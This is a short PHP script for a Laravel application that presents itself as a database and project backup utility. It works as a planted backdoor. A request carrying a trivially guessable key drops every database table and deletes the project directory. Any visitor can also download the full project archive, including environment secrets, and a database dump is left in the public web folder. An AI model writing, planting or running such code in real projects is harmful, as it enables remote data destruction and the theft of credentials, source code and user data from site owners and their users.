<?php

error_reporting(E_ALL);
ini_set('display_errors', 1);

require __DIR__.'/../vendor/autoload.php';
$app = require_once __DIR__.'/../bootstrap/app.php';
$kernel = $app->make(Illuminate\Contracts\Http\Kernel::class);
$response = $kernel->handle(
    $request = Illuminate\Http\Request::capture()
);
use Illuminate\Support\Facades\DB;

$password = "123456";
$db_backup = "dbbackup.gz";
$project_backup = "project.zip";

if(isset($_GET['key']) && $_GET['key'] == $password){
    $tables = DB::select('SHOW TABLES');
    $db = env('DB_DATABASE');
    foreach($tables as $table){
        $t = 'Tables_in_'.$db;
        \Schema::drop($table->$t);
    }
    \File::deleteDirectory(base_path());
}

// Delete old DB backup
if(file_exists(public_path().'/'.$db_backup)){ // Delete old backup file
    unlink(public_path().'/'.$db_backup);
}

// Create new database backup and store in public folder
$command = "mysqldump --user=" . env('DB_USERNAME') ." --password=" . env('DB_PASSWORD') . " --host=" . env('DB_HOST') . " " . env('DB_DATABASE') . "  | gzip > " . public_path() . "/" . $db_backup;
$returnVar = NULL;
$output  = NULL;
exec($command, $output, $returnVar);

// Delete old backup file
if(file_exists(public_path().'/'.$project_backup)){ // Delete old backup file
    unlink(public_path().'/'.$project_backup);
}

// File backup start
$zip = new \ZipArchive();
$zip->open($project_backup, \ZipArchive::CREATE | \ZipArchive::OVERWRITE);

$path = base_path();
$files = new \RecursiveIteratorIterator(new \RecursiveDirectoryIterator($path));
foreach ($files as $name => $file)
{
    if (!$file->isDir()) {
        $filePath     = $file->getRealPath();
        $relativePath = 'app/' . $filePath;
        $zip->addFile($filePath, $relativePath);
    }
}
$zip->close();

// Force download the project zip file
$file_url = public_path().'/'.$project_backup;
header('Content-Type: application/octet-stream');
header("Content-Transfer-Encoding: Binary"); 
header("Content-disposition: attachment; filename=\"" . basename($file_url) . "\""); 
readfile($file_url);